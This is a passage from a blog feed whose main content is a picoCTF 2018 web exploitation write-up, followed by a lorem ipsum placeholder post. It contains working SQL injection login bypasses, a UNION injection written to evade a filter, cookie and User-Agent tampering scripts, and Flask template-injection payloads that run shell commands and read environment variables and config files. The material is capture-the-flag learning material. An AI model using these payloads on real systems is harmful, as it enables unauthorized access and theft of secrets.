<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">for</span> i in <span style="color:#f1fa8c">`</span>strings radix<span style="color:#f1fa8c">`</span> ; <span style="color:#ff79c6">do</span> <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$i</span> | base64 -d 2&gt;/dev/null | grep pico ; <span style="color:#ff79c6">done</span>
</code></pre></td></tr></table>
</div>
</div><p>Reverse engineering the assembler code of the base64 implementation is surprisingly challenging</p>
<p>TODO: reverse engineer assembly code</p>
<p><a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/imul">imul</a>
<a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/div">div</a></p>
<h2 id="keygen-me">keygen-me</h2>
<ul>
<li><a href="./resources/keygen-me-1/activate">activate</a></li>
<li><strong>solution</strong>: <a href="./resources/keygen-me-1/get_flag.py">get_flag.py</a></li>
</ul>
]]></content></item><item><title>picoCTF 2018 - Web Exploitation</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-web-exploitation/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-web-exploitation/</guid><description>first challenges logon explore website logon with any username and password, we are logged on and edit cookies admin=True with developper tools refresh the page and get the flag inspect-me 1 2 3 4 5 6 explore html css javascript files or use recursive wget to download website wget --recursive http://2018shell.picoctf.com:47428 grep -r flag 2018shell.picoctf.com\:47428/ 2018shell.picoctf.com:47428/mycss.css:/* I learned CSS! Here&amp;#39;s part 2/3 of the flag: ct0r_g4dget_e96dd105} */ 2018shell.</description><content type="html"><![CDATA[<h2 id="first-challenges">first challenges</h2>
<ol>
<li>logon</li>
<li>explore website</li>
<li>logon with any username and password, we are logged on</li>
<li>and edit cookies <code>admin=True</code> with developper tools</li>
<li>refresh the page and get the flag</li>
<li>inspect-me</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">explore html css javascript files or use recursive wget to download website
wget --recursive http://2018shell.picoctf.com:47428
grep -r flag 2018shell.picoctf.com<span style="color:#f1fa8c">\:</span>47428/
2018shell.picoctf.com:47428/mycss.css:/* I learned CSS! Here<span style="color:#f1fa8c">&#39;s part 2/3 of the flag: ct0r_g4dget_e96dd105} */
</span><span style="color:#f1fa8c">2018shell.picoctf.com:47428/index.html: &lt;!-- I learned HTML! Here&#39;</span>s part 1/3 of the flag: picoCTF<span style="color:#ff79c6">{</span>ur_4_real_1nspe --&gt;
2018shell.picoctf.com:47428/myjs.js:/* I learned JavaScript! Here&#39;s part 3/3 of the flag:  */
</code></pre></td></tr></table>
</div>
</div><h2 id="client-side-is-still-bad">client-side-is-still-bad</h2>
<p>login is the source code, in the javascript function verify()</p>
<h2 id="logon">Logon</h2>
<p>we can login without password, except for admin.
Once connected, we can change the &lsquo;admin&rsquo; cookie value to &lsquo;True&rsquo;</p>
<h2 id="no-login">No Login</h2>
<p>We simply create a new cookie &lsquo;admin&rsquo; with the value &lsquo;1&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re

BASE_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://2018shell.picoctf.com:39670&#39;</span>

cookie <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">dict</span>(admin<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;1&#39;</span>)
response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get( BASE_URL <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/flag&#39;</span>, cookies<span style="color:#ff79c6">=</span>cookie)
<span style="color:#8be9fd;font-style:italic">print</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,response<span style="color:#ff79c6">.</span>text)[<span style="color:#bd93f9">0</span>]
</code></pre></td></tr></table>
</div>
</div><h2 id="irish-name-repo">irish-name-repo</h2>
<p>we can use the browser developer tools to enable a hidden form POST param &lsquo;debug=1&rsquo;. This allows us to discover the backen SQL request <code>SELECT * FROM users WHERE name='X' AND password='Y'</code>
Let&rsquo;s replace the username X with <code>' OR 1=1--</code> so that the WHERE clause is always true:</p>
<p>SQL query: SELECT * FROM users WHERE name='' OR 1=1&ndash;' AND password='</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re

URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;http://2018shell.picoctf.com:28402/login.php&#34;</span>
params <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;username&#39;</span>:<span style="color:#f1fa8c">&#34;&#39; or 1=1--&#34;</span>, <span style="color:#f1fa8c">&#39;password&#39;</span>:<span style="color:#f1fa8c">&#39;Y&#39;</span>, <span style="color:#f1fa8c">&#39;debug&#39;</span>:<span style="color:#f1fa8c">&#39;0&#39;</span>}

r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post(URL, data<span style="color:#ff79c6">=</span>params)
flag <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">&#34;picoCTF{.*}&#34;</span>, r<span style="color:#ff79c6">.</span>content<span style="color:#ff79c6">.</span>decode())[<span style="color:#bd93f9">0</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(flag)
</code></pre></td></tr></table>
</div>
</div><h2 id="mr-robots">Mr Robots</h2>
<p>open website /robots.txt to get the flag location</p>
<h2 id="secret-agent">Secret Agent</h2>
<p>We can change the User-Agent to Google</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re
BASE_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://2018shell.picoctf.com:46162&#39;</span>

header <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#39;User-Agent&#39;</span>: <span style="color:#f1fa8c">&#39;Googlebot&#39;</span>}
response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>get( BASE_URL <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/flag&#39;</span>,headers<span style="color:#ff79c6">=</span>header)
<span style="color:#8be9fd;font-style:italic">print</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,response<span style="color:#ff79c6">.</span>text)[<span style="color:#bd93f9">0</span>]
</code></pre></td></tr></table>
</div>
</div><h2 id="buttons">Buttons</h2>
<p>There is no form when we push button2, so we have to implement it</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re

BASE_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://2018shell.picoctf.com:65107/&#39;</span>

response <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post( BASE_URL <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/button2.php&#39;</span>)
<span style="color:#8be9fd;font-style:italic">print</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,response<span style="color:#ff79c6">.</span>text)[<span style="color:#bd93f9">0</span>]
</code></pre></td></tr></table>
</div>
</div><h2 id="the-vault">The Vault</h2>
<p>website is detecting SQL injection through this filter <code>$pattern =&quot;/.*['\&quot;].*OR.*/i&quot;;</code> but we can exploit the password field with UNION instead</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; curl -d <span style="color:#f1fa8c">&#34;debug=1&amp;username=asd&amp;password=&#39; UNION SELECT 1 FROM users WHERE 1=1 \;&#34;</span> -X POST http://2018shell.picoctf.com:53261/login.php
</code></pre></td></tr></table>
</div>
</div><p>In python, we can send a POST request, there is no need to html encode the parameters</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> requests
<span style="color:#ff79c6">import</span> re
<span style="color:#6272a4">#from urllib.parse import quote_plus</span>

BASE_URL <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;http://2018shell.picoctf.com:53261/&#39;</span>

injection <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#39; UNION SELECT 1 FROM users WHERE 1=1 -- - &#34;</span>
<span style="color:#6272a4">#injection = quote_plus(injection)</span>

params <span style="color:#ff79c6">=</span> {
    <span style="color:#f1fa8c">&#34;debug&#34;</span> : <span style="color:#f1fa8c">&#34;1&#34;</span>,
    <span style="color:#f1fa8c">&#34;username&#34;</span> : <span style="color:#f1fa8c">&#34;asd&#34;</span>,
    <span style="color:#f1fa8c">&#34;password&#34;</span> : injection
}
r <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>post( BASE_URL <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;/login.php&#39;</span>, data<span style="color:#ff79c6">=</span>params)
<span style="color:#8be9fd;font-style:italic">print</span> (re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#39;picoCTF{.*}&#39;</span>,r<span style="color:#ff79c6">.</span>text)[<span style="color:#bd93f9">0</span>])
</code></pre></td></tr></table>
</div>
</div><h2 id="artisinal-handcrafted-http-3">Artisinal Handcrafted HTTP 3</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /  <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> flag.local
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /login  <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> flag.local
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">POST</span> /login  <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> flag.local
Content-Type<span style="color:#ff79c6">:</span> application/x-www-form-urlencoded
Content-Length<span style="color:#ff79c6">:</span> 38

user=realbusinessuser&amp;pass=potoooooooo
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#50fa7b">GET</span> /  <span style="color:#ff79c6">HTTP</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">1.1</span>
Host<span style="color:#ff79c6">:</span> flag.local
Cookie<span style="color:#ff79c6">:</span> real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/
</code></pre></td></tr></table>
</div>
</div><h2 id="flaskcards">Flaskcards</h2>
<pre><code>''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').popen('grep -r pico \*').read()
config.items()`

''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').path.join('app','config.py')
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**['open'](&lt;''.__class__.mro()[1].__subclasses__()[687]()._module.__builtins__.__import__('os').path.join('app','config.py')&gt;).
read()

some more fun
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').listdir('.')
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').popen('ls app').read()
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').popen('id').read()
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').environ
''.**class**.mro()[1].**subclasses**()[687]().\_module.**builtins**.**import**('os').uname()
</code></pre>
]]></content></item><item><title>test 2</title><link>https://0xade1.github.io/posts/2021/01/test-2/</link><pubDate>Fri, 29 Jan 2021 20:15:44 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/01/test-2/</guid><description>Intro Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.
Title 1 Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna.</description><content type="html"><![CDATA[<h1 id="intro">Intro</h1>






  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>



<h1 id="title-1">Title 1</h1>






  <p><em>Curabitur tincidunt, eros ut tincidunt efficitur, eros enim mollis ligula, vitae aliquet augue magna at magna. Phasellus augue metus, blandit ut dignissim quis, pulvinar eget nisl. Nulla sodales malesuada ornare. Aenean suscipit, erat at suscipit feugiat, massa lorem scelerisque enim, non sodales est lacus sit amet velit. Phasellus gravida nulla ut dictum mollis. Aliquam interdum porta turpis, sed bibendum nunc aliquam a. Cras et porta ante. Curabitur eget purus nulla. Praesent sit amet interdum tortor. Nunc vestibulum ullamcorper velit a commodo. Fusce tincidunt rhoncus iaculis. Nullam vel egestas sem. Morbi eget sagittis felis. Morbi faucibus consequat elementum.</em></p>

  <p><em>Maecenas enim elit, iaculis ac consectetur sit amet, faucibus nec enim. Aenean eu accumsan odio. Nullam tristique risus eros, imperdiet sodales elit feugiat sed. Phasellus id convallis dui, convallis malesuada urna. Mauris et leo ante. Donec scelerisque magna eleifend urna ullamcorper rhoncus. Nunc ac porta nibh. Sed in sagittis nisl. Quisque facilisis consectetur nunc quis ullamcorper. In a lorem condimentum, pellentesque metus id, posuere nisi. Donec tempor ex ornare diam rhoncus, eget sodales ante tempor. Etiam neque metus, pulvinar et fringilla sit amet, facilisis a lacus. Fusce a tincidunt ligula, sed tempor nunc.</em></p>

  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>



<h1 id="title-2">Title 2</h1>






  <p><em>Proin sit amet libero eleifend, eleifend eros ut, imperdiet mauris. Nam at massa nec lectus tempus ullamcorper ut id odio. Cras finibus lectus sit amet enim congue dictum. Phasellus malesuada sollicitudin metus non tincidunt. Vivamus purus quam, accumsan nec neque sed, aliquam suscipit nibh. Etiam blandit viverra lectus, ac rutrum mauris interdum sit amet. Curabitur mollis sem at accumsan dapibus. Nulla vel dolor elementum, pharetra metus cursus, gravida velit. Ut eget dolor vel risus molestie venenatis non sit amet ipsum.</em></p>

  <p><em>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Etiam quis velit purus. Maecenas ut eleifend neque. Nunc eget tempus nisl. Vivamus malesuada, ante vel commodo rutrum, mi turpis sollicitudin libero, quis lacinia tortor odio sed purus. Phasellus hendrerit mollis tempor. Suspendisse cursus quis eros vel iaculis. Cras eu rutrum risus, sit amet iaculis dolor. In vitae eros a neque ullamcorper cursus quis non ex.</em></p>

  <p><em>Etiam vulputate est eu hendrerit efficitur. Integer sem ligula, fermentum eget condimentum sed, porttitor tincidunt felis. Nulla facilisi. Sed volutpat lacinia porta. Mauris fermentum malesuada metus non tempor. Pellentesque tincidunt in tortor sit amet volutpat. Maecenas diam felis, pharetra nec quam quis, sagittis ullamcorper mi. Integer ac elit vitae purus volutpat consectetur venenatis et mauris. Praesent nec commodo libero, in pellentesque velit. Sed bibendum lacus fringilla, egestas nulla eget, cursus neque. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Pellentesque malesuada, quam a tincidunt commodo, dolor diam rutrum felis, a pulvinar justo orci quis ipsum.</em></p>



<h1 id="conclusion">Conclusion</h1>






